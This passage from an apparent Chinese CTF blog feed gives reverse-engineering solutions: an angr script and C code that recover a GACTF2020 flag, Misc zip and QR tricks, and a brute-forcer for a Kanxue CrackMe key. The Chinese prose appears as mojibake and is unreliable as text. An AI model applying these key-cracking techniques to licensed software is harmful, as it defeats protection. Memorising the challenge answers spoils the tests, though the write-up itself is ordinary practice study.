class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">29</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">313</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">30</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">371</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">31</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">70</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>ä»ä¸Šé¢æ‰“å°å‡ºçš„æ‰§è¡Œï¼Œæ•´ä¸ªç¨‹åºå°±å¾ˆæ¸…æ¥šäº†ã€‚</p><p>é¦–å…ˆå°±æ˜¯é€†å‡ºè¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´å‹æ•°æ®ï¼Œä½†çœ‹äº†ä¸‹ç®—æ³•ï¼Œç¡®å®éº»çƒ¦ã€‚ã€‚æ­£å¥½ä¹‹å‰å­¦ä¹ äº†ä¸‹angrç¬¦å·æ‰§è¡Œï¼Œç”¨è¿™ä¸ªé¢˜å°è¯•ä¸€ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, claripy, sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_success</span><span class="params">(state)</span>:</span></span><br><span class="line">    std_out = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'flag:'</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_false</span><span class="params">(state)</span>:</span></span><br><span class="line">    std_out = state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'é”™è¯¯ä¿¡æ¯'</span> <span class="keyword">in</span> std_out:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">'EasyRe'</span>) <span class="comment">#ä»£è¡¨ç¨‹åºçš„â€œåˆå§‹åŒ–æ˜ åƒâ€</span></span><br><span class="line">init_state = proj.factory.entry_state() <span class="comment">#è¡¨ç¤ºæ¨¡æ‹Ÿä»ç¨‹åºçš„å…¥å£ç‚¹å¼€å§‹çš„çŠ¶æ€</span></span><br><span class="line">good_addr = <span class="number">0x08048BE0</span> </span><br><span class="line">bad_addr = <span class="number">0x08048BF1</span></span><br><span class="line">sim = proj.factory.simgr(init_state) <span class="comment">#ç”³æ˜stateçš„æ¨¡æ‹Ÿç®¡ç†å™¨simæ¥ç”¨äºæ‰§è¡Œæ¨¡æ‹Ÿçš„ç¨‹åº</span></span><br><span class="line">sim.explore(find = is_success) <span class="comment">#æ¨¡æ‹Ÿç¨‹åºçš„æ‰§è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>): <span class="comment">#æ‰“å°å‡ºæ ‡å‡†è¾“å…¥ï¼Œè¾“å‡ºï¼Œé”™è¯¯è¾“å‡ºã€‚</span></span><br><span class="line">print(sim.found[<span class="number">0</span>].posix.dumps(i))</span><br></pre></td></tr></table></figure><p><img src="/2020/08/30/GACTF2020/image-20200913202220431.png" alt="image-20200913202220431"></p><p>å¾ˆå¿«å¾—åˆ°äº†ç­”æ¡ˆï¼Œå°è¯•è¾“å…¥ä¸€ä¸‹ï¼Œæ­£ç¡®ã€‚<img src="/2020/08/30/GACTF2020/image-20200913200733625.png" alt="image-20200913200733625"></p><p>å¼€å§‹ä½¿ç”¨è¿™ä¸ªæ•´å‹æ•°æ®è®¡ç®—å‡ºdword_804B2A0æ•°ç»„ä¸­çš„4ä¸ªå€¼ã€‚</p><p>åˆšåˆšè®¡ç®—å®Œå‡†å¤‡ä¾æ¬¡é€†å‡ºflagä¸­çš„æ¯ä¸€ä½æ—¶å°±æƒ³åˆ°ï¼Œå…¶å®å¯ä»¥ä¸ç”¨è®¡ç®—ç¬¬ä¸€ä¸ªè¾“å…¥çš„æ•´å‹æ•°æ®ï¼Œå› ä¸ºç»™äº†flagçš„æ ¼å¼ä¸ºGACTFã€‚ã€‚ã€‚æ ¹æ®è¿™ä¸ªå°±å¯ä»¥è®¡ç®—å‡ºdword_804B2A0æ•°ç»„ä¸­çš„æ¯ä¸€ä½ã€‚ã€‚</p><p>å¼€å§‹åˆ©ç”¨ä¹‹å‰å¤åˆ¶åˆ°Cè¯­è¨€ç¼–è¯‘å™¨ä¸­çš„ä»£ç æ‰“å°å‡ºflagä¸­æ¯ä¸€ä½ä¸dword_804B2A0[]æ•°ç»„å¼‚æˆ–çš„æ˜¯å“ªä¸€ä½ï¼Œä¸æœ€åéœ€è¦ç”¨æ¥æ¯”è¾ƒçš„æ•°æ®ã€‚</p><p>æœ€åç®—ä¸€ä¸‹ï¼Œå¾—åˆ°flagï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a[] = &#123;<span class="number">267</span>, <span class="number">122</span>, <span class="number">149</span>, <span class="number">262</span>, <span class="number">125</span>, <span class="number">173</span>, <span class="number">303</span>, <span class="number">357</span>,</span><br><span class="line"><span class="number">301</span>, <span class="number">303</span>, <span class="number">313</span>, <span class="number">269</span>, <span class="number">187</span>, <span class="number">8</span>, <span class="number">269</span>, <span class="number">319</span>, </span><br><span class="line"><span class="number">314</span>, <span class="number">353</span>, <span class="number">87</span>, <span class="number">288</span>, <span class="number">269</span>, <span class="number">319</span>, <span class="number">319</span>, <span class="number">181</span>,</span><br><span class="line"><span class="number">275</span>, <span class="number">160</span>, <span class="number">289</span>, <span class="number">269</span>, <span class="number">11</span>, <span class="number">313</span>, <span class="number">371</span>, <span class="number">70</span>&#125;;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">char</span> b[] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>,</span><br><span class="line"><span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> s[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;, i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">s[<span class="number">0</span>] = <span class="string">'G'</span> ^ a[<span class="number">0</span>];</span><br><span class="line">s[<span class="number">1</span>] = <span class="string">'A'</span> ^ a[<span class="number">1</span>];</span><br><span class="line">s[<span class="number">2</span>] = <span class="string">'T'</span> ^ a[<span class="number">3</span>];</span><br><span class="line">s[<span class="number">3</span>] = <span class="string">'C'</span> ^ a[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">flag[i] = a[i] ^ s[b[i]];</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//GACTF&#123;c7ack_m3_sh3ll_smc_vm_0k?&#125;</span></span><br></pre></td></tr></table></figure><p>å…¶å®ä¹Ÿæ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªé¢˜ï¼Œåˆ©ç”¨flagçš„æ ¼å¼ã€‚ã€‚</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="SignIN"><a href="#SignIN" class="headerlink" title="SignIN"></a>SignIN</h3><p>å°†äºŒç»´ç æ‹¼æ¥ä¸€ä¸‹ï¼Œæ‰«å‡ºflagã€‚</p><p><img src="/2020/08/30/GACTF2020/image-20200913201331681.png" alt="image-20200913201331681"></p><p><strong>welc0me_t0_GACTF_have_Fun</strong></p><h3 id="crymisc"><a href="#crymisc" class="headerlink" title="crymisc"></a>crymisc</h3><p>ä¸€ä¸ªwordæ–‡æ¡£ï¼Œä½†æ˜¯æ‰“ä¸å¼€ã€‚æ‹–è¿›010editoræŸ¥çœ‹ï¼Œå‘ç°<strong>504B(PK)</strong>ï¼Œæ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ã€‚</p><p>æ”¹æ–‡ä»¶åç¼€åå…¶ä¸­ä¸€ä¸ªæ–‡ä»¶è§£å‹å¤±è´¥ã€‚</p><p><img src="/2020/08/30/GACTF2020/image-20200913202250211.png" alt="image-20200913202250211"></p><p>è°·æ­Œçœ‹è§å¯ä»¥ä½¿ç”¨winraræ¥ä¿®å¤ä¸€ä¸‹ã€‚</p><p>ä¸‹è½½åï¼Œåœ¨winrarä¸­æ‰“å¼€å´æ˜¯æç¤ºæœ‰å¯†ç ã€‚ã€‚é‚£å°±çŒœæµ‹æ˜¯ä¼ªåŠ å¯†äº†ã€‚ã€‚ä¸‹é¢ä¿®æ”¹ä¸ºå¶æ•°å³å¯ã€‚<img src="/2020/08/30/GACTF2020/image-20200913203212543.png" alt="image-20200913203212543"></p><p>360å‹ç¼©è¿˜æ˜¯å¥‡å¦™ï¼Œä¼ªåŠ å¯†æ–‡ä»¶ç›´æ¥æç¤ºæ–‡ä»¶å‡ºé”™ã€‚ã€‚</p><p>ç„¶åæ‰“å¼€ä¸€å¼ å›¾ç‰‡å’Œä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ã€‚æ–‡æœ¬æ–‡ä»¶æ²¡æœ‰ä»€ä¹ˆï¼ŒæŸ¥çœ‹å›¾ç‰‡äºŒè¿›åˆ¶ä¿¡æ¯ã€‚åœ¨æœ€åå‘ç°ï¼š<img src="/2020/08/30/GACTF2020/image-20200913203442903.png" alt="image-20200913203442903"></p><p>åˆæ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä½†åœ¨å¼€å¤´å‡ºç°ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä»ç»„æˆçŒœæµ‹æ˜¯base64åŠ å¯†ã€‚è§£å¯†å¾—åˆ°ï¼š<img src="/2020/08/30/GACTF2020/image-20200913203556733.png" alt="image-20200913203556733"></p><p>çœ‹æ¥æ˜¯åé¢å‹ç¼©åŒ…çš„å¯†ç ã€‚ç„¶åæŠŠè¯¥å‹ç¼©åŒ…çš„å¤´è¡¥å…¨ï¼ˆ<strong>504b</strong>ï¼‰ï¼Œè¾“å…¥å¯†ç è§£å‹ï¼š<img src="/2020/08/30/GACTF2020/image-20200913203858388.png" alt="image-20200913203858388"></p><p>åˆ°è¿™ä¸€æ­¥å°±ä¸€ç›´å¡ä½äº†ã€‚ã€‚ã€‚å®åœ¨æ²¡è§è¿‡è¿™ä¸ªè¡¨æƒ…å¯†ç ï¼Œè°·æ­Œç™¾åº¦æŸ¥åˆ°çš„ä¿¡æ¯åˆä¸ä¼šç”¨ï¼Œï¼Œï¼Œ</p><p>æ¯”èµ›å®Œäº†æ‰ä»ä¸€ä½å¸ˆå‚…å“ªé‡ŒçŸ¥é“è¦è‡ªå·±ä»githubæ‰¾åˆ°è¿™ä¸ªé¡¹ç›®è‡ªå·±æ­å»ºä¸€ä¸‹ç¯å¢ƒï¼Œç„¶åæ ¹æ®ä¸€å¼ è¡¨æ˜ å°„å…³ç³»è§£å¯†ã€‚ã€‚ã€‚</p><p>æ ¹æ®å¸ˆå‚…çš„æŒ‡å¯¼æ­å»ºå®Œåï¼Œä»é¢˜ç›®ä¹Ÿå¾ˆå®¹æ˜“æƒ³åˆ°è§£å¯†çš„keyæ˜¯å“­è„¸è¡¨æƒ…ã€‚</p><p>æœ€åè§£å¯†ï¼š<img src="/2020/08/30/GACTF2020/image-20200913204636657.png" alt="image-20200913204636657"></p><p>è¿˜æœ‰ä¸€ä¸ªå‘å°±æ˜¯ï¼Œä¸‹é¢çš„è¡¨æƒ…å…¶å®æ˜¯åŒä¸€ä¸ªï¼Œæˆ‘è¿˜çº ç»“åŠå¤©ã€‚ã€‚<img src="/2020/08/30/GACTF2020/image-20200913204805711.png" alt="image-20200913204805711"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CrackMe</title>
      <link href="/2020/07/31/CrackMe/"/>
      <url>/2020/07/31/CrackMe/</url>
      
        <content type="html"><![CDATA[<p>æœ¬å¸–ä¸»è¦å¯¹ç»ƒä¹ Crackmeçš„çŸ¥è¯†ç‚¹ä¸çªç ´ç‚¹è¿›è¡Œè®°å½•ã€‚<a id="more"></a></p><h2 id="ç¿©è‹¥æƒŠé¸¿"><a href="#ç¿©è‹¥æƒŠé¸¿" class="headerlink" title="ç¿©è‹¥æƒŠé¸¿"></a>ç¿©è‹¥æƒŠé¸¿</h2><p>â€”â€”é¢˜ç›®æ¥è‡ªçœ‹é›ªé¢˜åº“</p><p>æ— å£³ï¼Œçª—å£ç¨‹åºï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ªnameä¸keyçœ‹ç¨‹åºçš„åé¦ˆã€‚</p><p>æœ‰é”™è¯¯æç¤ºæ¡†ï¼Œè½½å…¥ODæœç´¢ç›¸åº”çš„APIï¼Œåªæ˜¯å¾ˆå¤šAPIåºå·ï¼Œåº”è¯¥æ˜¯MFC42åº“åºå·å¯¼å‡ºçš„å‡½æ•°ã€‚<img src="/2020/07/31/CrackMe/image-20200813120443310.png" alt="image-20200813120443310"></p><p>é‚£ç°åœ¨æœç´¢å­—ç¬¦ä¸²çœ‹çœ‹ï¼Œæˆ–ä½¿ç”¨ä¸€ä¸ªä¸‹æ–­ç‚¹çš„æ’ä»¶ä¸‹æ–­ï¼Œç„¶åæŸ¥çœ‹è°ƒç”¨å †æ ˆä¿¡æ¯æ‰¾åˆ°APIã€‚è¿™é‡Œ2ç§æ–¹æ³•å‡å¯ã€‚<img src="/2020/07/31/CrackMe/image-20200813121018755.png" alt="image-20200813121018755"></p><p>å‘ä¸Šå›æº¯ï¼š<img src="/2020/07/31/CrackMe/image-20200813125708215.png" alt="image-20200813125708215"></p><p>å¼€å§‹åœ¨ODä¸­è·Ÿè¿›<strong>004015E0</strong>å‡½æ•°ï¼Œä½†å¾ˆå¤šMFC42ä¸­å¯¼å‡ºçš„å‡½æ•°ï¼Œè·Ÿèµ·æ¥å®åœ¨æ¼ç«ã€‚ã€‚è¿˜æ˜¯ç»“åˆidaçš„F5å¤§æ³•æ¥çœ‹ï¼š</p><p>ä¸€å¼€å§‹é€†å‘åˆ†æç®—æ³•å°±å‘ç°äº†é—®é¢˜ï¼š<img src="/2020/07/31/CrackMe/image-20200813133718116.png" alt="image-20200813133718116"></p><p>ä¸Šé¢è¯´æ˜æ˜¯ä¸ªæ­»èƒ¡åŒï¼Œè¿™é‡Œå°±å¯ä»¥çŒœæµ‹æ˜¯ä¸Šé¢æœ‰å¯¹å‡½æ•°å¯¹402010å¤„ä»£ç è¿›è¡Œäº†é‡å†™ã€‚çœ‹å‰é¢çš„ä»£ç ï¼Œæœä¸å…¶ç„¶ï¼šç”¨äº†æˆ‘ä»¬è¾“å…¥keyçš„å‰4ä½æ¥é‡å†™402010å¤„ä»£ç ï¼Œä¸”æœ€åä¸€ä¸ªæ ¡éªŒï¼ˆæ£€æµ‹é‡å†™çš„ä»£ç æ˜¯å¦æ­£ç¡®ï¼‰ï¼Œæ ¡éªŒé€šè¿‡æ‰å°†é‡å†™çš„ä»£ç æ‹·è´åˆ°åŸåœ°å€å¤„ï¼ˆ0x402010ï¼‰ã€‚<img src="/2020/07/31/CrackMe/image-20200813134136959.png" alt="image-20200813134136959"></p><p>çœ‹äº†çœ‹é‡å†™ä¸æ ¡éªŒçš„ä»£ç ï¼Œéƒ½ä¸å¤æ‚ï¼Œå¤§å¤šæ•°å¯ä»¥ç›´æ¥å¤åˆ¶åˆ°ç¼–è¯‘å™¨æ¥ä½œä¸ºä¸€ä¸ªå‡½æ•°ä½¿ç”¨è¿›è€Œçˆ†ç ´å‡ºæ­£ç¡®çš„é‡å†™çš„ä»£ç ï¼Œä¹Ÿå°±æ˜¯å¾—åˆ°keyçš„å‰4ä½ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> hash_table[<span class="number">0x401</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_401500</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; </span><br><span class="line">  <span class="keyword">int</span> *v2; </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; </span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; </span><br><span class="line"></span><br><span class="line">  hash_table[<span class="number">0x400</span>] = <span class="number">1</span>;</span><br><span class="line">  v0 = <span class="number">0x0EDB88320</span>;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v2 = hash_table;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *v2 = v1;</span><br><span class="line">    result = v1;</span><br><span class="line">    v4 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = ((result &amp; <span class="number">1</span>) != <span class="number">0</span> ? v0 : <span class="number">0</span>) ^ (result &gt;&gt; <span class="number">1</span>);</span><br><span class="line">      --v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v4 );</span><br><span class="line">    *v2 = result;</span><br><span class="line">    ++v2;</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 &lt; <span class="number">0x400</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decode_code</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> result; </span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  a3 ^= <span class="number">0xD9EE7A1B</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(result + a1) ^= *((<span class="keyword">char</span> *)&amp;a3 + (result &amp; <span class="number">3</span>));</span><br><span class="line">      ++result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( result &lt; a2 );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_401550</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> *a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; </span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = ~a1; v3 &lt; a3; ++v3 )</span><br><span class="line">    i = hash_table[(<span class="keyword">unsigned</span> __int8)i ^ *(<span class="keyword">unsigned</span> __int8 *)(v3 + a2)] ^ (i &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">return</span> ~i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] = &#123;<span class="number">0x402010</span><span class="number">-0x402AC0</span>çš„æ•°æ®&#125;; </span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> s = <span class="number">0x30303030</span>, e = <span class="number">0x7a7a7a7a</span>, i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> decode_data[<span class="number">0xAB0</span>];</span><br><span class="line"><span class="keyword">clock_t</span> start, <span class="built_in">end</span>, total;</span><br><span class="line"> </span><br><span class="line">start = clock();</span><br><span class="line">sub_401500();</span><br><span class="line"><span class="keyword">for</span>(i = s; i &lt;= e; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> *a = (<span class="keyword">char</span> *)&amp;i;</span><br><span class="line"><span class="keyword">if</span>(a[<span class="number">0</span>] &lt; <span class="number">48</span> || a[<span class="number">1</span>] &lt; <span class="number">48</span> || a[<span class="number">2</span>] &lt; <span class="number">48</span> || a[<span class="number">3</span>] &lt; <span class="number">48</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>((a[<span class="number">0</span>] &gt; <span class="number">57</span> &amp;&amp; a[<span class="number">0</span>] &lt; <span class="number">65</span>) || (a[<span class="number">1</span>] &gt; <span class="number">57</span> &amp;&amp; a[<span class="number">1</span>] &lt; <span class="number">65</span>) || </span><br><span class="line">(a[<span class="number">2</span>] &gt; <span class="number">57</span> &amp;&amp; a[<span class="number">2</span>] &lt; <span class="number">65</span>) || (a[<span class="number">3</span>] &gt; <span class="number">57</span> &amp;&amp; a[<span class="number">3</span>] &lt; <span class="number">65</span>))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>((a[<span class="number">0</span>] &gt; <span class="number">90</span> &amp;&amp; a[<span class="number">0</span>] &lt; <span class="number">97</span>) || (a[<span class="number">1</span>] &gt; <span class="number">90</span> &amp;&amp; a[<span class="number">1</span>] &lt; <span class="number">97</span>) ||</span><br><span class="line">(a[<span class="number">2</span>] &gt; <span class="number">90</span> &amp;&amp; a[<span class="number">2</span>] &lt; <span class="number">97</span>) || (a[<span class="number">3</span>] &gt; <span class="number">90</span> &amp;&amp; a[<span class="number">3</span>] &lt; <span class="number">97</span>))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[<span class="number">0</span>] &gt; <span class="number">122</span> || a[<span class="number">1</span>] &gt; <span class="number">122</span> || a[<span class="number">2</span>] &gt; <span class="number">122</span> || a[<span class="number">3</span>] &gt; <span class="number">122</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(decode_data, ida_chars, <span class="number">0xAB0</span>); </span><br><span class="line">decode_code(decode_data, <span class="number">0xAB0</span>, i);</span><br><span class="line"><span class="keyword">if</span>(sub_401550(<span class="number">0</span>, decode_data, <span class="number">0xAB0</span>) == <span class="number">0xAFFE390F</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%X\n"</span>, i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c%c%c%c\n"</span>, a[<span class="number">0</span>], a[<span class="number">1</span>], a[<span class="number">2</span>], a[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">end</span> = clock();</span><br><span class="line">total = (<span class="built_in">end</span>-start)/CLOCKS_PER_SEC;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"çˆ†ç ´æ‰€ç”¨æ—¶é—´ï¼š%dåˆ†:%dç§’\n"</span>, total/<span class="number">60</span>, total%<span class="number">60</span>);</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span 